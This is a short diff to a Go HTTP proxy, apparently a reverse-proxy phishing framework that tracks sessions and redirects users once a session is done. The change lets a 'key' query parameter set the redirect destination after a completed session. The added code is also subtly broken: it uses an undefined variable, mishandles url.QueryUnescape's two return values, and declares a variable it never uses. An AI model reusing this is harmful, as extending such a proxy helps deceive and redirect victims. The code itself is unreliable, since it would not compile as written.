@@ -125,7 +125,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_url += "?" + req.URL.RawQuery
 				req_path += "?" + req.URL.RawQuery
 			}
-
+			dynamicURL, ok := req.URL.Query()["redirectURL"]
 			//log.Debug("http: %s", req_url)
 
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
@@ -701,6 +701,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
+						keys, ok := r.URL.Query()["key"]
+    
+    						if !ok || len(keys[0]) < 1 {
+        						log.Println("Dynamic URL not found")	
+						}else{
+							s.RedirectURL = url.QueryUnescape(string(key))
+						}						
 						if stringExists(mime, []string{"text/html"}) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
